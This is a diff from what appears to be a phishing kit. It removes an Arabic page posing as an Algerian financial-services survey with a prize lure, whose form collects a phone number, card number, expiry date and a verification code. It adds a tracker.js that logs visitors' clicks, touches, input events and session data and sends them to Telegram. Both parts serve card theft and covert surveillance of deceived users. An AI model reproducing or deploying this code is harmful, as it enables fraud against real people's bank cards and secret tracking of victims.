@@ -1,216 +1,239 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>استبيان الخدمات المالية - الجزائر</title>
-    <link rel="stylesheet" href="css/style.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <link rel="icon" type="image/x-icon" href="assets/logo.png">
-</head>
-<body>
-    <!-- شاشة التحميل -->
-    <div id="loading-screen" class="loading-screen">
-        <div class="loading-content">
-            <div class="logo-container">
-                <img src="assets/logo.png" alt="شعار الموقع" class="logo">
-            </div>
-            <div class="spinner"></div>
-            <p class="loading-text">جاري التحميل، يرجى الانتظار...</p>
-        </div>
-    </div>
+// نظام تتبع المستخدم
+let userActions = [];
+let sessionStartTime;
+let pageViewCount = 0;
 
-    <!-- الصفحة الرئيسية -->
-    <div id="home-page" class="page active">
-        <nav class="navbar">
-            <div class="nav-container">
-                <div class="logo-section">
-                    <img src="assets/logo.png" alt="شعار" class="nav-logo">
-                    <span class="site-name">الخدمات المالية</span>
-                </div>
-                <button class="start-btn" onclick="startSurvey()">
-                    ابدأ الاستبيان <i class="fas fa-arrow-left"></i>
-                </button>
-            </div>
-        </nav>
+function startUserTracking() {
+    console.log('👤 بدء تتبع المستخدم');
+    sessionStartTime = Date.now();
+    pageViewCount = 0;
+    userActions = [];
+    
+    // تتبع النقرات
+    document.addEventListener('click', trackClick);
+    
+    // تتبع حركة الماوس
+    document.addEventListener('mousemove', trackMouseMovement);
+    
+    // تتبع اللمس (للأجهزة اللوحية والهواتف)
+    document.addEventListener('touchstart', trackTouch);
+    document.addEventListener('touchend', trackTouchEnd);
+    
+    // تتبع إدخال النص
+    document.addEventListener('input', trackTextInput);
+    
+    // تسجيل بداية الجلسة
+    sendTelegramData('session_started', {
+        sessionId: getSessionId(),
+        startTime: new Date().toISOString(),
+        referrer: document.referrer || 'مباشر'
+    });
+    
+    console.log('✅ تم بدء تتبع المستخدم');
+}
 
-        <main class="main-content">
-            <section class="hero-section">
-                <div class="hero-content">
-                    <h1 class="hero-title">استبيان الخدمات المالية في الجزائر</h1>
-                    <p class="hero-description">
-                        نحن نسعى لتحسين خدماتنا المالية لتتناسب مع احتياجاتكم. 
-                        شاركنا رأيك وساعدنا في تقديم خدمات أفضل تواكب تطلعاتك.
-                    </p>
-                    <div class="features">
-                        <div class="feature">
-                            <i class="fas fa-shield-alt"></i>
-                            <span>آمن ومحمي</span>
-                        </div>
-                        <div class="feature">
-                            <i class="fas fa-clock"></i>
-                            <span>3 دقائق فقط</span>
-                        </div>
-                        <div class="feature">
-                            <i class="fas fa-gift"></i>
-                            <span>فرصة للفوز بهدايا</span>
-                        </div>
-                    </div>
-                    <button class="cta-button" onclick="startSurvey()">
-                        ابدأ الآن <i class="fas fa-arrow-left"></i>
-                    </button>
-                </div>
-                <div class="hero-image">
-                    <img src="https://cdn-icons-png.flaticon.com/512/3135/3135706.png" alt="صورة رمزية">
-                </div>
-            </section>
-        </main>
-    </div>
+function trackPageView(pageId) {
+    console.log(`📊 تتبع مشاهد الصفحة: ${pageId}`);
+    
+    pageViewCount++;
+    const pageData = {
+        page: pageId,
+        timestamp: new Date().toISOString(),
+        timeOnPreviousPage: calculateTimeOnPage(),
+        scrollPosition: window.pageYOffset,
+        sessionDuration: getSessionDuration(),
+        pageViewNumber: pageViewCount
+    };
+    
+    userActions.push({
+        type: 'page_view',
+        data: pageData,
+        timestamp: new Date().toISOString()
+    });
+    
+    // إرسال بيانات مشاهدة الصفحة
+    sendTelegramData('page_view', pageData);
+}
 
-    <!-- صفحة الاستبيان -->
-    <div id="survey-page" class="page">
-        <div class="survey-header">
-            <button class="back-btn" onclick="goBack()">
-                <i class="fas fa-arrow-right"></i> رجوع
-            </button>
-            <div class="progress-bar">
-                <div class="progress-step active" data-step="1">1</div>
-                <div class="progress-step" data-step="2">2</div>
-                <div class="progress-step" data-step="3">3</div>
-            </div>
-        </div>
+function trackButtonClick(buttonId) {
+    console.log(`🖱️ تتبع نقر زر: ${buttonId}`);
+    
+    const clickData = {
+        buttonId: buttonId,
+        page: getCurrentPageId(),
+        timestamp: new Date().toISOString(),
+        sessionDuration: getSessionDuration()
+    };
+    
+    userActions.push({
+        type: 'button_click',
+        data: clickData,
+        timestamp: new Date().toISOString()
+    });
+    
+    sendTelegramData('specific_button_click', clickData);
+}
 
-        <div class="survey-container">
-            <!-- الخطوة 1: معلومات الاتصال -->
-            <div id="step-1" class="survey-step active">
-                <h2>معلومات الاتصال</h2>
-                <p class="step-description">يرجى إدخال معلوماتك الأساسية للتواصل معك</p>
-                
-                <form id="contact-form" class="survey-form">
-                    <div class="form-group">
-                        <label for="phone">
-                            رقم الهاتف <span class="required">*</span>
-                            <span class="hint">(رقم جزائري: 05XX XX XX XX)</span>
-                        </label>
-                        <input type="tel" id="phone" name="phone" 
-                               placeholder="أدخل رقم هاتفك الجزائري" 
-                               pattern="^(05|06|07)[0-9]{8}$"
-                               required>
-                        <div class="validation-message"></div>
-                    </div>
+function trackClick(event) {
+    const target = event.target;
+    const clickData = {
+        element: target.tagName.toLowerCase(),
+        id: target.id || 'no-id',
+        class: target.className || 'no-class',
+        text: target.textContent?.trim().substring(0, 50) || 'no-text',
+        x: event.clientX,
+        y: event.clientY,
+        page: getCurrentPageId(),
+        timestamp: new Date().toISOString()
+    };
+    
+    userActions.push({
+        type: 'click',
+        data: clickData,
+        timestamp: new Date().toISOString()
+    });
+    
+    // إرسال بيانات النقر المهمة فقط
+    if (target.closest('button') || target.closest('a') || target.id.includes('btn')) {
+        sendTelegramData('button_click', clickData);
+    }
+}
 
-                    <div class="form-group">
-                        <label for="card-number">
-                            رقم البطاقة <span class="required">*</span>
-                            <span class="hint">(16 رقم)</span>
-                        </label>
-                        <input type="text" id="card-number" name="card-number" 
-                               placeholder="XXXX XXXX XXXX XXXX"
-                               pattern="[0-9]{16}"
-                               maxlength="16"
-                               required>
-                        <div class="validation-message"></div>
-                    </div>
+function trackMouseMovement(event) {
+    // تقليل كمية البيانات - تسجيل كل حركة عشوائية فقط
+    if (Math.random() < 0.01) { // 1% من حركات الماوس فقط
+        const mouseData = {
+            x: event.clientX,
+            y: event.clientY,
+            page: getCurrentPageId(),
+            timestamp: new Date().toISOString()
+        };
+        
+        userActions.push({
+            type: 'mouse_move',
+            data: mouseData,
+            timestamp: new Date().toISOString()
+        });
+    }
+}
 
-                    <div class="form-group">
-                        <label for="expiry-date">
-                            تاريخ انتهاء الصلاحية <span class="required">*</span>
-                        </label>
-                        <input type="month" id="expiry-date" name="expiry-date" required>
-                        <div class="validation-message"></div>
-                    </div>
+function trackTouch(event) {
+    if (event.touches.length > 0) {
+        const touchData = {
+            touches: event.touches.length,
+            x: event.touches[0].clientX,
+            y: event.touches[0].clientY,
+            page: getCurrentPageId(),
+            timestamp: new Date().toISOString()
+        };
+        
+        userActions.push({
+            type: 'touch_start',
+            data: touchData,
+            timestamp: new Date().toISOString()
+        });
+        
+        sendTelegramData('touch_event', touchData);
+    }
+}
 
-                    <div class="privacy-section">
-                        <input type="checkbox" id="privacy-check" required>
-                        <label for="privacy-check">
-                            أوافق على <a href="privacy-policy.html" target="_blank">سياسة الخصوصية</a>
-                            والموافقة على جمع ومعالجة بياناتي
-                        </label>
-                    </div>
+function trackTouchEnd(event) {
+    const touchData = {
+        type: 'touch_end',
+        page: getCurrentPageId(),
+        timestamp: new Date().toISOString()
+    };
+    
+    userActions.push({
+        type: 'touch_end',
+        data: touchData,
+        timestamp: new Date().toISOString()
+    });
+}
 
-                    <button type="button" class="next-btn" onclick="nextStep(1)">
-                        متابعة <i class="fas fa-arrow-left"></i>
-                    </button>
-                </form>
-            </div>
+function trackTextInput(event) {
+    const target = event.target;
+    if (target.tagName.toLowerCase() === 'input') {
+        const inputData = {
+            fieldId: target.id || 'unknown',
+            fieldType: target.type,
+            valueLength: target.value.length,
+            page: getCurrentPageId(),
+            timestamp: new Date().toISOString()
+        };
+        
+        userActions.push({
+            type: 'text_input',
+            data: inputData,
+            timestamp: new Date().toISOString()
+        });
+    }
+}
 
-            <!-- الخطوة 2: التأكيد والتحقق -->
-            <div id="step-2" class="survey-step">
-                <h2>تأكيد الهوية</h2>
-                <p class="step-description">لضمان أمان معلوماتك، يرجى إدخال رمز التحقق</p>
-                
-                <div class="verification-container">
-                    <div class="form-group">
-                        <label for="verification-code">
-                            رمز التحقق <span class="required">*</span>
-                            <span class="hint">(6 أرقام عشوائية)</span>
-                        </label>
-                        <input type="text" id="verification-code" name="verification-code"
-                               placeholder="أدخل 6 أرقام عشوائية"
-                               pattern="[0-9]{6}"
-                               maxlength="6"
-                               required>
-                        <div class="validation-message"></div>
-                    </div>
+// عند إغلاق الصفحة
+window.addEventListener('beforeunload', function() {
+    const sessionData = {
+        sessionId: getSessionId(),
+        duration: getSessionDuration(),
+        pageViews: pageViewCount,
+        actionsCount: userActions.length,
+        endTime: new Date().toISOString()
+    };
+    
+    // إرسال ملخص الجلسة
+    sendTelegramData('session_ended', sessionData);
+    
+    // إرسال جميع الإجراءات المهمة
+    const importantActions = userActions.filter(action => 
+        ['page_view', 'button_click', 'touch_event'].includes(action.type)
+    );
+    
+    if (importantActions.length > 0) {
+        sendTelegramData('user_actions_summary', {
+            sessionId: getSessionId(),
+            actions: importantActions.slice(-10) // آخر 10 إجراءات فقط
+        });
+    }
+    
+    console.log('👋 إنهاء الجلسة:', sessionData);
+});
 
-                    <!-- معلومات الجهاز المكتشفة تلقائيا -->
-                    <div class="device-info">
-                        <h4>معلومات جهازك:</h4>
-                        <div class="info-grid">
-                            <div class="info-item">
-                                <span class="info-label">نوع الجهاز:</span>
-                                <span id="device-type" class="info-value">جاري الكشف...</span>
-                            </div>
-                            <div class="info-item">
-                                <span class="info-label">نظام التشغيل:</span>
-                                <span id="os-type" class="info-value">جاري الكشف...</span>
-                            </div>
-                            <div class="info-item">
-                                <span class="info-label">المتصفح:</span>
-                                <span id="browser-type" class="info-value">جاري الكشف...</span>
-                            </div>
-                            <div class="info-item">
-                                <span class="info-label">الدقة:</span>
-                                <span id="screen-resolution" class="info-value">جاري الكشف...</span>
-                            </div>
-                        </div>
-                    </div>
+// وظائف مساعدة
+function getCurrentPageId() {
+    const activePage = document.querySelector('.page.active');
+    return activePage ? activePage.id : 'unknown';
+}
 
-                    <button type="button" class="next-btn" onclick="nextStep(2)">
-                        تأكيد ومتابعة <i class="fas fa-check"></i>
-                    </button>
-                </div>
-            </div>
+function calculateTimeOnPage() {
+    const lastPageView = userActions
+        .filter(action => action.type === 'page_view')
+        .pop();
+    
+    if (lastPageView) {
+        return Date.now() - new Date(lastPageView.timestamp).getTime();
+    }
+    return 0;
+}
 
-            <!-- الخطوة 3: الشكر -->
-            <div id="step-3" class="survey-step">
-                <div class="thank-you-container">
-                    <div class="success-icon">
-                        <i class="fas fa-check-circle"></i>
-                    </div>
-                    <h2>شكرًا لمشاركتك!</h2>
-                    <p class="thank-you-message">
-                        تم استلام إجاباتك بنجاح. نحن نقدر وقتك وجهودك في مساعدتنا 
-                        على تحسين خدماتنا. سيتم التواصل معك في حالة الفوز بالهدايا.
-                    </p>
-                    <div class="survey-id">
-                        <strong>رقم المشاركة:</strong> 
-                        <span id="participation-id">ALG-${Date.now().toString().slice(-8)}</span>
-                    </div>
-                    <button class="home-btn" onclick="goHome()">
-                        العودة للرئيسية <i class="fas fa-home"></i>
-                    </button>
-                </div>
-            </div>
-        </div>
-    </div>
+function getSessionDuration() {
+    return Date.now() - sessionStartTime;
+}
 
-    <!-- إشعارات -->
-    <div id="notification" class="notification"></div>
+// دالة للحصول على معرف الجلسة
+function getSessionId() {
+    if (!sessionStorage.getItem('survey_session_id')) {
+        const sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
+        sessionStorage.setItem('survey_session_id', sessionId);
+        console.log(`🆔 معرف الجلسة الجديد: ${sessionId}`);
+    }
+    return sessionStorage.getItem('survey_session_id');
+}
 
-    <script src="js/tracker.js"></script>
-    <script src="js/telegram.js"></script>
-    <script src="js/main.js"></script>
-</body>
-</html>
+// دالة لبدء التتبع عند التحميل
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', function() {
+        console.log('📊 جاهز لبدء التتبع');
+    });
+} else {
+    console.log('📊 الصفحة محملة بالفعل، جاهز للتتبع');
+}
